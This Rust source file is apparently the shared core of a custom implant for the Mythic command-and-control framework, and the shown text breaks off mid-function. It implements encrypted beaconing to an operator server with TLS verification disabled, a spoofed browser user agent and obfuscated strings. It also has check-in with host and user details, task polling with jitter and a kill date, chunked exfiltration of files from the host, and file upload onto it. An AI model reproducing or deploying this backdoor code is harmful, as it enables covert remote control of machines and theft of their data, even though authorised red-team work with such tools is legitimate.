// link-common — Mythic protocol implementation
//
// Wire format (Mythic standard): base64( UUID(36) + IV(16) + AES-256-CBC(PKCS7(JSON)) + HMAC-SHA256(32) )
// Key: raw 32-byte AES key from AESPSK C2 profile parameter (base64-decoded at runtime).
// HMAC uses the same AES key over (IV + ciphertext).
// CALLBACK address is stored as hex(IV_16 || AES-256-CBC(address) || HMAC_32) — see encrypt_config/decrypt_config.

use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

pub mod dispatch;

// ── Wire types Mythic ──────────────────────────────────────────────────────────

// ── Structured browser types (Mythic process_browser / file_browser) ──────────

#[derive(serde::Serialize, Clone)]
pub struct ProcessEntry {
    pub process_id: u32,
    pub name: String,
    pub parent_process_id: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command_line: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bin_path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
}

#[derive(serde::Serialize, Clone)]
pub struct FileBrowserEntry {
    pub name: String,
    pub is_file: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub size: Option<u64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub permissions: Option<FileBrowserPermission>,
}

#[derive(serde::Serialize, Clone)]
pub struct FileBrowserPermission {
    pub permissions: String,
}

#[derive(serde::Serialize, Clone)]
pub struct FileBrowserResult {
    pub host: String,
    pub is_file: bool,
    pub name: String,
    pub parent_path: String,
    pub files: Vec<FileBrowserEntry>,
    pub success: bool,
}

// ── CommandOutput (dispatch return type) ──────────────────────────────────────

pub struct CommandOutput {
    pub text: String,
    pub processes: Option<Vec<ProcessEntry>>,
    pub file_browser: Option<FileBrowserResult>,
}

impl CommandOutput {
    pub fn text(s: String) -> Self {
        Self {
            text: s,
            processes: None,
            file_browser: None,
        }
    }
}

impl From<String> for CommandOutput {
    fn from(s: String) -> Self {
        Self::text(s)
    }
}

// ── Mythic wire types ─────────────────────────────────────────────────────────

#[derive(serde::Serialize)]
pub struct CheckinMessage<'a> {
    pub action: &'a str,
    pub uuid: &'a str,
    pub user: String,
    pub host: String,
    pub pid: u32,
    pub ips: Vec<String>,
    pub os: &'a str,
    pub architecture: &'a str,
    pub domain: &'a str,
    pub integrity_level: u8,
    pub extra_info: &'a str,
    pub sleep_info: &'a str,
}

#[derive(serde::Deserialize, Default)]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

#[derive(serde::Serialize)]
pub struct GetTaskingMessage<'a> {
    pub action: &'a str,
    pub tasking_size: i32,
}

#[derive(serde::Deserialize, Default, Clone)]
pub struct Task {
    #[serde(default)]
    pub id: String,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub parameters: String,
}

#[derive(serde::Deserialize, Default)]
pub struct GetTaskingResponse {
    pub action: String,
    pub tasks: Vec<Task>,
}

#[derive(serde::Serialize)]
pub struct TaskResponse {
    pub task_id: String,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub completed: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user_output: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub download: Option<DownloadRegistration>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub upload: Option<UploadRequest>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub processes: Option<Vec<ProcessEntry>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_browser: Option<FileBrowserResult>,
}

#[derive(serde::Serialize)]
pub struct DownloadRegistration {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_chunks: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub filename: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_size: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub is_screenshot: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<String>,
}

#[derive(serde::Serialize)]
pub struct UploadRequest {
    pub chunk_size: usize,
    pub file_id: String,
    pub chunk_num: i64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
}

#[derive(serde::Deserialize, Default)]
pub struct PostResponseEntry {
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub file_id: String,
    #[serde(default)]
    pub task_id: String,
    #[serde(default)]
    pub error: String,
    #[serde(default)]
    pub total_chunks: i64,
    #[serde(default)]
    pub chunk_num: i64,
    #[serde(default)]
    pub chunk_data: String,
}

#[derive(serde::Deserialize, Default)]
pub struct PostResponse {
    #[serde(default)]
    pub action: String,
    #[serde(default)]
    pub responses: Vec<PostResponseEntry>,
}

#[derive(serde::Serialize)]
pub struct PostResponseMessage<'a> {
    pub action: &'a str,
    pub responses: Vec<TaskResponse>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

// build_client creates an HTTP client with TLS verification disabled.
// TLS verification is intentionally disabled because C2 infrastructure typically uses
// self-signed certificates. The transport is still encrypted via TLS; only certificate
// chain validation is skipped. The implant authenticates the server through the shared
// AES-256 key (AESPSK) — only a server with the correct key can produce valid responses.
pub fn build_client() -> ureq::Agent {
    use std::time::Duration;
    let tls = ureq::tls::TlsConfig::builder()
        .disable_verification(true)
        .build();
    let ua =
        obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string();
    let config = ureq::config::Config::builder()
        .timeout_global(Some(Duration::from_secs(30)))
        .user_agent(ua)
        .tls_config(tls)
        .build();
    ureq::Agent::new_with_config(config)
}

// ── AES-256-CBC + HMAC-SHA256 (Mythic standard) ───────────────────────────────

fn aes_cbc_encrypt(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    use aes::Aes256;
    use cbc::cipher::block_padding::Pkcs7;
    use cbc::cipher::{BlockEncryptMut, KeyIvInit};
    type Aes256CbcEnc = cbc::Encryptor<Aes256>;

    let enc = Aes256CbcEnc::new(key.into(), iv.into());
    let padded_len = plaintext.len() + (16 - plaintext.len() % 16);
    let mut buf = vec![0u8; padded_len];
    buf[..plaintext.len()].copy_from_slice(plaintext);
    let ct = enc
        .encrypt_padded_mut::<Pkcs7>(&mut buf, plaintext.len())
        .expect("encrypt");
    ct.to_vec()
}

fn aes_cbc_decrypt(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Option<Vec<u8>> {
    use aes::Aes256;
    use cbc::cipher::block_padding::Pkcs7;
    use cbc::cipher::{BlockDecryptMut, KeyIvInit};
    type Aes256CbcDec = cbc::Decryptor<Aes256>;

    let dec = Aes256CbcDec::new(key.into(), iv.into());
    let mut buf = ciphertext.to_vec();
    let pt = dec.decrypt_padded_mut::<Pkcs7>(&mut buf).ok()?;
    Some(pt.to_vec())
}

fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
    mac.update(data);
    mac.finalize().into_bytes().into()
}

fn verify_hmac(key: &[u8], data: &[u8], expected: &[u8]) -> bool {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
    mac.update(data);
    mac.verify_slice(expected).is_ok()
}

/// Decode a base64-encoded 32-byte AES key (from Mythic AESPSK).
pub fn decode_aes_key(b64_key: &str) -> Option<[u8; 32]> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    let bytes = STANDARD.decode(b64_key).ok()?;
    if bytes.len() != 32 {
        return None;
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Some(key)
}

/// Build a Mythic wire message: base64( UUID(36) + IV(16) + AES-256-CBC(JSON) + HMAC-SHA256(32) ).
/// Returns an empty string on encryption failure.
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let iv: [u8; 16] = rand::random();
    let ciphertext = aes_cbc_encrypt(payload_json.as_bytes(), key, &iv);

    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
    iv_ct.extend_from_slice(&iv);
    iv_ct.extend_from_slice(&ciphertext);
    let hmac = hmac_sha256(key, &iv_ct);

    let mut msg = Vec::with_capacity(36 + iv_ct.len() + 32);
    msg.extend_from_slice(uuid.as_bytes());
    msg.extend_from_slice(&iv_ct);
    msg.extend_from_slice(&hmac);

    STANDARD.encode(&msg)
}

/// Parse a Mythic wire message: base64-decode, strip UUID, verify HMAC, AES-CBC-decrypt.
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let blob = STANDARD.decode(raw).ok()?;
    // UUID(36) + IV(16) + at least 16 bytes ciphertext + HMAC(32)
    if blob.len() < 36 + 16 + 16 + 32 {
        return None;
    }

    let body = &blob[36..];
    let hmac_offset = body.len() - 32;
    let iv_ct = &body[..hmac_offset];
    let received_hmac = &body[hmac_offset..];

    if !verify_hmac(key, iv_ct, received_hmac) {
        return None;
    }

    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
    let ciphertext = &iv_ct[16..];
    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
    String::from_utf8(plaintext).ok()
}

/// Encrypt a config value (CALLBACK address) → hex(IV_16 || ciphertext || HMAC_32).
#[allow(dead_code)]
pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
    let iv: [u8; 16] = rand::random();
    let ciphertext = aes_cbc_encrypt(data.as_bytes(), key, &iv);

    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
    iv_ct.extend_from_slice(&iv);
    iv_ct.extend_from_slice(&ciphertext);
    let hmac = hmac_sha256(key, &iv_ct);

    let mut result = Vec::with_capacity(iv_ct.len() + 32);
    result.extend_from_slice(&iv_ct);
    result.extend_from_slice(&hmac);
    hex::encode(result)
}

/// Decrypt a hex(IV_16 || ciphertext || HMAC_32) config blob.
pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
    let data = hex::decode(enc_hex).ok()?;
    // IV(16) + at least 16 bytes ciphertext + HMAC(32)
    if data.len() < 16 + 16 + 32 {
        return None;
    }

    let hmac_offset = data.len() - 32;
    let iv_ct = &data[..hmac_offset];
    let received_hmac = &data[hmac_offset..];

    if !verify_hmac(key, iv_ct, received_hmac) {
        return None;
    }

    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
    let ciphertext = &iv_ct[16..];
    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
    String::from_utf8(plaintext).ok()
}

// ── Shared state (sleep / jitter / kill date) ──────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

pub fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}
pub fn set_sleep_seconds(s: u64) {
    SLEEP_SECONDS.store(s, Ordering::Relaxed);
}
pub fn get_jitter_percent() -> u32 {
    JITTER_PERCENT.load(Ordering::Relaxed)
}
pub fn set_jitter_percent(p: u32) {
    JITTER_PERCENT.store(p.min(100), Ordering::Relaxed);
}
pub fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN {
        None
    } else {
        Some(v)
    }
}
pub fn set_kill_date(ts: Option<i64>) {
    KILL_DATE.store(ts.unwrap_or(i64::MIN), Ordering::Relaxed);
}
pub fn should_exit() -> bool {
    if let Some(kd) = get_kill_date() {
        // Fail closed: if the system clock is before UNIX_EPOCH (corrupted,
        // VM boot without NTP), duration_since errors. Treat that as expired
        // so a kill date can never be silently bypassed by clock skew.
        let now_secs = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            Ok(now) => now.as_secs() as i64,
            Err(_) => return true,
        };
        return now_secs > kd;
    }
    false
}

// ── Timing ─────────────────────────────────────────────────────────────────────

pub fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
    if jitter_pct == 0 || base == 0 {
        return sleep(base);
    }
    let range = base * jitter_pct as u64 / 100;
    if range == 0 {
        return sleep(base);
    }
    let offset = rand::random::<u64>() % (2 * range + 1);
    let t = base.saturating_sub(range).saturating_add(offset);
    sleep(t.max(1));
}

// ── Shared helpers ─────────────────────────────────────────────────────────────

pub fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

/// Extract a single value from a Mythic parameters JSON object.
/// Falls back to the raw string if the key is absent or if input is not valid JSON.
/// Handles both string and number JSON values.
/// Example: extract_param(r#"{"path": "/tmp"}"#, "path") → "/tmp"
/// Example: extract_param(r#"{"seconds": 30}"#, "seconds") → "30"
pub fn extract_param(parameters: &str, key: &str) -> String {
    serde_json::from_str::<serde_json::Value>(parameters)
        .ok()
        .and_then(|v| {
            let val = v.get(key)?;
            Some(match val {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                _ => val.to_string(),
            })
        })
        .unwrap_or_default()
}

/// Expand a leading `~` to the user's home directory.
/// Shells expand `~` automatically but std::fs does not.
pub fn expand_tilde(path: &str) -> String {
    if path == "~" || path.starts_with("~/") {
        if let Ok(home) = std::env::var("HOME") {
            return format!("{}{}", home, &path[1..]);
        }
    }
    path.to_string()
}

pub fn list_dir(path: &str) -> String {
    let resolved = expand_tilde(path);
    match std::fs::read_dir(&resolved) {
        Ok(entries) => {
            let mut items: Vec<String> = entries
                .flatten()
                .map(|e| {
                    let name = e.file_name().to_string_lossy().into_owned();
                    if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                        format!("{}/", name)
                    } else {
                        name
                    }
                })
                .collect();
            items.sort();
            items.join("\n")
        }
        Err(e) => format!("[-] {}: {}", resolved, e),
    }
}

pub fn list_dir_browser(path: &str) -> CommandOutput {
    let resolved = expand_tilde(path);
    let dir_path = std::path::Path::new(&resolved);
    let canonical =
        std::fs::canonicalize(dir_path).unwrap_or_else(|_| std::path::PathBuf::from(&resolved));
    let name = canonical
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "/".into());
    let parent = canonical
        .parent()
        .map(|p| p.display().to_string())
        .unwrap_or_default();

    match std::fs::read_dir(&resolved) {
        Ok(entries) => {
            let mut file_entries = Vec::new();
            for entry in entries.flatten() {
                let entry_name = entry.file_name().to_string_lossy().into_owned();
                let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
                let metadata = entry.metadata().ok();
                file_entries.push(FileBrowserEntry {
                    name: entry_name,
                    is_file: !is_dir,
                    size: metadata.as_ref().map(|m| m.len()),
                    permissions: metadata.as_ref().map(|m| file_permissions(m)),
                });
            }
            // Sort once, by name, then derive the text view from the same
            // sorted order so the user_output and the file_browser JSON match.
            file_entries.sort_by(|a, b| a.name.cmp(&b.name));
            let text_items: Vec<String> = file_entries
                .iter()
                .map(|e| {
                    if e.is_file {
                        e.name.clone()
                    } else {
                        format!("{}/", e.name)
                    }
                })
                .collect();

            CommandOutput {
                text: text_items.join("\n"),
                processes: None,
                file_browser: Some(FileBrowserResult {
                    host: portable_hostname(),
                    is_file: false,
                    name,
                    parent_path: parent,
                    files: file_entries,
                    success: true,
                }),
            }
        }
        Err(e) => CommandOutput {
            text: format!("[-] {}: {}", resolved, e),
            processes: None,
            file_browser: Some(FileBrowserResult {
                host: portable_hostname(),
                is_file: false,
                name,
                parent_path: parent,
                files: Vec::new(),
                success: false,
            }),
        },
    }
}

fn portable_hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .map(|s| s.trim().to_string())
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

#[cfg(unix)]
fn file_permissions(m: &std::fs::Metadata) -> FileBrowserPermission {
    use std::os::unix::fs::PermissionsExt;
    FileBrowserPermission {
        permissions: format!("{:o}", m.permissions().mode() & 0o7777),
    }
}

#[cfg(not(unix))]
fn file_permissions(m: &std::fs::Metadata) -> FileBrowserPermission {
    FileBrowserPermission {
        permissions: if m.permissions().readonly() {
            "readonly".into()
        } else {
            "readwrite".into()
        },
    }
}

const CHUNK_SIZE: usize = 512_000;

/// Send a post_response message to Mythic and parse the response entries.
fn send_post_response(
    client: &ureq::Agent,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    responses: Vec<TaskResponse>,
) -> Vec<PostResponseEntry> {
    let action = obfstr::obfstr!("post_response").to_string();
    let msg = PostResponseMessage {
        action: &action,
        responses,
    };
    let json = serde_json::to_string(&msg).unwrap_or_default();
    let wire = build_mythic_message(callback_id, &json, key);

    client
        .post(&format!("{}{}", base_url, uri))
        .content_type("application/octet-stream")
        .send(&wire)
        .ok()
        .and_then(|mut r| r.body_mut().read_to_string().ok())
        .and_then(|raw| parse_mythic_message(&raw, key))
        .and_then(|j| serde_json::from_str::<PostResponse>(&j).ok())
        .map(|r| r.responses)
        .unwrap_or_default()
}

/// Download a file from the agent to Mythic using chunked transfer protocol.
pub fn mythic_download(
    client: &ureq::Agent,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    task_id: &str,
    path: &str,
) -> String {
    if path.is_empty() {
        return "[-] Usage: download <path>".into();
    }
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => return format!("[-] {}", e),
    };

    let full_path = std::fs::canonicalize(path)
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| path.to_string());

    let total_chunks = ((data.len() as f64) / CHUNK_SIZE as f64).ceil() as i64;
    let total_chunks = total_chunks.max(1);

    // Step 1: Register the download with Mythic
    let reg = TaskResponse {
        task_id: task_id.to_string(),
        completed: false,
        user_output: None,
        status: None,
        download: Some(DownloadRegistration {
            total_chunks: Some(total_chunks),
            full_path: Some(full_path.clone()),
            filename: Some(
                std::path::Path::new(&full_path)
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| full_path.clone()),
            ),
            host: Some(portable_hostname()),
            chunk_size: Some(CHUNK_SIZE),
            is_screenshot: Some(false),
            chunk_num: None,
            file_id: None,
            chunk_data: None,
        }),
        upload: None,
        processes: None,
        file_browser: None,
    };
    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![reg]);
    let file_id = match resp.first() {
        Some(e) if e.status == "success" && !e.file_id.is_empty() => e.file_id.clone(),
        _ => return "[-] Failed to register download with Mythic".into(),
    };

    // Step 2: Send chunks
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    for chunk_num in 1..=total_chunks {
        let start = ((chunk_num - 1) as usize) * CHUNK_SIZE;
        let end = (start + CHUNK_SIZE).min(data.len());
        let chunk_data = STANDARD.encode(&data[start..end]);

        let chunk_resp = TaskResponse {
            task_id: task_id.to_string(),
            completed: chunk_num == total_chunks,
            user_output: if chunk_num == total_chunks {
                Some(format!(
                    "[+] Downloaded {} ({} bytes)",
                    full_path,
                    data.len()
                ))
            } else {
                None
            },
            status: None,
            download: Some(DownloadRegistration {
                total_chunks: None,
                full_path: None,
                filename: None,
                host: None,
                chunk_size: None,
                is_screenshot: None,
                chunk_num: Some(chunk_num),
                file_id: Some(file_id.clone()),
                chunk_data: Some(chunk_data),
            }),
            upload: None,
            processes: None,
            file_browser: None,
        };
        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![chunk_resp]);
        if resp.first().map(|e| e.status.as_str()) != Some("success") {
            return format!("[-] Chunk {} upload failed", chunk_num);
        }
    }
    format!("[+] Downloaded {} ({} bytes)", full_path, data.len())
}

/// Upload a file from Mythic to the agent using chunked transfer protocol.
#[allow(clippy::too_many_arguments)]
pub fn mythic_upload(
    client: &ureq::Agent,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    task_id: &str,
    file_id: &str,
    dest_path: &str,
) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    if file_id.is_empty() || dest_path.is_empty() {
        return "[-] upload requires file and remote_path parameters".into();
    }

    let full_path = if dest_path.starts_with('/') || dest_path.starts_with('\\') {
        dest_path.to_string()
    } else {
        std::env::current_dir()
            .map(|d| d.join(dest_path).display().to_string())
            .unwrap_or_else(|_| dest_path.to_string())
    };

    // Request first chunk to get total_chunks
    let req = TaskResponse {
        task_id: task_id.to_string(),
        completed: false,
        user_output: None,
        status: None,
        download: None,
        upload: Some(UploadRequest {
            chunk_size: CHUNK_SIZE,
            file_id: file_id.to_string(),
            chunk_num: 1,
            full_path: Some(full_path.clone()),
        }),
        processes: None,
        file_browser: None,
    };
    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
    let first = match resp.first() {
        Some(e) if e.status == "success" => e,
        Some(e) => return format!("[-] Upload failed: {}", e.error),
        None => return "[-] No response from Mythic for upload".into(),
    };

    let total_chunks = first.total_chunks;
    let mut file_data = match STANDARD.decode(&first.chunk_data) {
        Ok(d) => d,
        Err(e) => return format!("[-] Chunk 1 decode error: {}", e),
    };

    // Request remaining chunks
    for chunk_num in 2..=total_chunks {
        let req = TaskResponse {
            task_id: task_id.to_string(),
            completed: false,
            user_output: None,
            status: None,
            download: None,
            upload: Some(UploadRequest {
                chunk_size: CHUNK_SIZE,
                file_id: file_id.to_string(),
                chunk_num,
                full_path: None,
            }),
            processes: None,
            file_browser: None,
        };
        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
        match resp.first() {
            Some(e) if e.status == "success" => match STANDARD.decode(&e.chunk_data) {
                Ok(d) => file_data.extend_from_slice(&d),
                Err(e) => return format!("[-] Chunk {} decode error: {}", chunk_num, e),
            },
            _ => return format!("[-] Chunk {} fetch failed", chunk_num),
        }
    }

    match std::fs::write(&full_path, &file_data) {
        Ok(()) => format!("[+] Uploaded {} ({} bytes)", full_path, file_data.len()),
        Err(e) => format!("[-] Write error: {}", e),
    }
}

// Keep simple versions for non-networked tests / fallback
pub fn download_file(path: &str) -> String {
    if path.is_empty() {
        return "[-] Usage: download <path>".into();
    }
    match std::fs::read(path) {
        Ok(buf) => format!("[+] File read: {} ({} bytes)", path, buf.len()),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn upload_file(_args: &str) -> String {
    "[-] Upload requires Mythic file transfer protocol".into()
}

pub fn handle_sleep_command(args: &str) -> String {
    let parts: Vec<&str> = args.split_whitespace().collect();
    if parts.is_empty() {
        return format!(
            "sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    if let Ok(s) = parts[0].parse::<f64>() {
        set_sleep_seconds(s as u64);
        if parts.len() > 1 {
            if let Ok(j) = parts[1].parse::<f64>() {
                set_jitter_percent(j as u32);
            }
        }
        return format!(
            "[+] sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    "[-] Usage: sleep <seconds> [jitter%]".into()
}

pub fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        return match get_kill_date() {
            Some(ts) => format!("killdate: {}", ts),
            None => "no killdate set".into(),
        };
    }
    if args.to_lowercase() == "clear" {
        set_kill_date(None);
        return "[+] killdate cleared".into();
    }
    if let Ok(ts) = args.parse::<i64>() {
        set_kill_date(Some(ts));
        return format!("[+] killdate: {}", ts);
    }
    "[-] Usage: killdate <unix_timestamp|clear>".into()
}

// ── C2 loop ────────────────────────────────────────────────────────────────────

pub struct RegisterInfo {
    pub user: String,
    pub host: String,
    pub ip: String,
    pub os: &'static str,
    pub arch: &'static str,
    pub pid: u32,
    pub integrity_level: u8,
}

pub fn run_c2_loop<F>(
    callback: &str,
    implant_secret: &str,
    payload_uuid: &str,
    callback_uri: &str,
    reg: RegisterInfo,
    dispatch: F,
) where
    F: Fn(&str, &str) -> CommandOutput,
{
    use zeroize::Zeroize;

    let mut encryption_key = match decode_aes_key(implant_secret) {
        Some(k) => k,
        None => return,
    };
    let decrypted_callback =
        decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());

    let client = build_client();
    let base = if decrypted_callback.starts_with("http") {
        decrypted_callback.to_string()
    } else {
        format!("https://{}", decrypted_callback)
    };
    let uri = if callback_uri.is_empty() {
        "/"
    } else {
        callback_uri
    };

    // ── Checkin ───────────────────────────────────────────────────────────────
    let checkin_action = obfstr::obfstr!("checkin").to_string();
    let checkin_ips: Vec<String> = if reg.ip.is_empty() || reg.ip == "unknown" {
        Vec::new()
    } else {
        vec![reg.ip.clone()]
    };
    let checkin = CheckinMessage {
        action: &checkin_action,
        uuid: payload_uuid,
        user: reg.user.clone(),
        host: reg.host.clone(),
        pid: reg.pid,
        ips: checkin_ips,
        os: reg.os,
        architecture: reg.arch,
        domain: "",
        integrity_level: reg.integrity_level,
        extra_info: "",
        sleep_info: "",
    };

    let checkin_json = serde_json::to_string(&checkin).unwrap_or_default();
    let checkin_msg = build_mythic_message(payload_uuid, &checkin_json, &encryption_key);

    #[allow(unused_assignments)]
    let mut callback_id = String::new();
    let mut retry_delay: u64 = 5;

    loop {
        if should_exit() {
            return;
        }
        if let Ok(mut resp) = client
            .post(&format!("{}{}", base, uri))
            .content_type("application/octet-stream")
            .send(&checkin_msg)
        {
            if let Ok(raw) = resp.body_mut().read_to_string() {
                if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
                    if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
                        if cr.status == "success" {
                            callback_id = cr.id;
                            break;
                        }
                    }
                }
            }
        }
        sleep_with_jitter(retry_delay, 30);
        retry_delay = (retry_delay * 2).min(60);
    }

    // ── Polling loop ──────────────────────────────────────────────────────────
    // Bug #6: track consecutive invalid responses. A 200 OK with a body that
    // fails HMAC verification / JSON parsing is indistinguishable from "no
    // tasks" in the original code, so a blue-team take-down serving a static
    // page would make the agent poll forever without noticing. After enough
    // invalid responses we back off harder to avoid hammering a dead endpoint.
    let mut invalid_response_streak: u32 = 0;
    loop {
        if should_exit() {
            break;
        }

        let gt_action = obfstr::obfstr!("get_tasking").to_string();
        let get_tasking = GetTaskingMessage {
            action: &gt_action,
            tasking_size: -1,
        };
        let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
        let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);

        // Bug #6: distinguish network errors, invalid responses (200 OK but body
        // fails HMAC/JSON), and valid empty tasking. A take-down or MITM serving
        // a static page returns 200 + non-Mythic body, which previously looked
        // identical to "no tasks". We now count consecutive invalid responses
        // and back off harder once the streak exceeds a threshold.
        let tasks: Vec<Task> = match client
            .post(&format!("{}{}", base, uri))
            .content_type("application/octet-stream")
            .send(&get_msg)
            .and_then(|mut r| r.body_mut().read_to_string())
        {
            Ok(raw) => match parse_mythic_message(&raw, &encryption_key)
                .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
            {
                Some(resp) => {
                    // Valid Mythic response: reset the streak.
                    invalid_response_streak = 0;
                    resp.tasks
                }
                None => {
                    // 200 OK but body failed HMAC or JSON parse: suspicious.
                    invalid_response_streak = invalid_response_streak.saturating_add(1);
                    let backoff = if invalid_response_streak > 10 {
                        // Degraded mode: 4x the normal sleep to avoid hammering
                        // a dead/hijacked endpoint.
                        get_sleep_seconds().saturating_mul(4)
                    } else {
                        get_sleep_seconds()
                    };
                    sleep_with_jitter(backoff, get_jitter_percent());
                    continue;
                }
            },
            Err(_) => {
                // Network error (connection refused, DNS, non-2xx status).
                invalid_response_streak = invalid_response_streak.saturating_add(1);
                let backoff = if invalid_response_streak > 10 {
                    get_sleep_seconds().saturating_mul(4)
                } else {
                    get_sleep_seconds()
                };
                sleep_with_jitter(backoff, get_jitter_percent());
                continue;
            }
        };

        if tasks.is_empty() {
            sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
            continue;
        }

        let mut responses = Vec::new();
        let mut should_exit = false;
        for task in &tasks {
            if task.command == "exit" {
                responses.push(TaskResponse {
                    task_id: task.id.clone(),
                    completed: true,
                    user_output: Some("[+] exiting".into()),
                    status: None,
                    download: None,
                    upload: None,
                    processes: None,
                    file_browser: None,
                });
                should_exit = true;
                break;
            }

            // Download and upload use Mythic's chunked file transfer protocol
            // and require multiple round-trips — handle them outside of dispatch.
            if task.command == obfstr::obfstr!("download") {
                let path = expand_tilde(&extract_param(&task.parameters, "path"));
                let output = mythic_download(
                    &client,
                    &base,
                    uri,
                    &callback_id,
                    &encryption_key,
                    &task.id,
                    &path,
                );
                let is_error = output.starts_with("[-]");
                responses.push(TaskResponse {
                    task_id: task.id.clone(),
                    completed: true,
                    user_output: Some(output),
                    status: if is_error {
                        Some("error".to_string())
                    } else {
                        None
                    },
                    download: None,
                    upload: None,
                    processes: None,
                    file_browser: None,
                });
                continue;
            }
            if task.command == obfstr::obfstr!("upload") {
                let file_id = extract_param(&task.parameters, "file");
                let dest = expand_tilde(&extract_param(&task.parameters, "remote_path"));
                let output = mythic_upload(
                    &client,
                    &base,
                    uri,
                    &callback_id,
                    &encryption_key,
                    &task.id,
                    &file_id,
                    &dest,
                );
                let is_error = output.starts_with("[-]");
